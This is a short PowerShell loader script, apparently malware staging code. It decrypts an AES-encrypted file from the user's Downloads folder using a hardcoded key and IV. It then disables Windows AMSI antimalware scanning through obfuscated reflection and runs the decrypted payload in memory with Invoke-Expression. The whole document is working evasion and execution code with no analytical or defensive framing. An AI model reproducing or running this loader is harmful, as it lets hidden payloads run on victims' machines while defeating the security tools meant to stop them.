# === CONFIG ===
$KeyB64 = "pU7oz2E8Ru0JciLnr7ho+S0K2cqilfe6Y7kibS+Odtw="
$IVB64  = "kwXf8vxWPffXc0nlaqYdfQ=="
$InputFile = "$env:USERPROFILE\Downloads\wp.data.txt"

# === DECRYPT ===
$Key         = [Convert]::FromBase64String($KeyB64)
$IV          = [Convert]::FromBase64String($IVB64)
$CipherBytes = [System.IO.File]::ReadAllBytes($InputFile)

$AES         = [System.Security.Cryptography.Aes]::Create()
$AES.KeySize = 256
$AES.Mode    = 'CBC'
$AES.Padding = 'PKCS7'
$AES.Key     = $Key
$AES.IV      = $IV

$Decryptor  = $AES.CreateDecryptor()
$PlainBytes = $Decryptor.TransformFinalBlock($CipherBytes, 0, $CipherBytes.Length)
$ScriptText = [System.Text.Encoding]::UTF8.GetString($PlainBytes)

# === AMSI BYPASS + EXECUTE IN MEMORY ===
$c=$"A";$b="ms";$d="iUt";$g="ils";$res=$c+$b+$d+$g
$w="am";$s='siI';$j='nit';$k='Fai';$r='led'
$res2=$w+$s+$j+$k+$r
$a=[Ref].Assembly.GetType("System.Management.Automation.$res")
$a2=$a.GetField($res2,'NonPublic,Static')
$a2.SetValue($null,$true)

Invoke-Expression $ScriptText
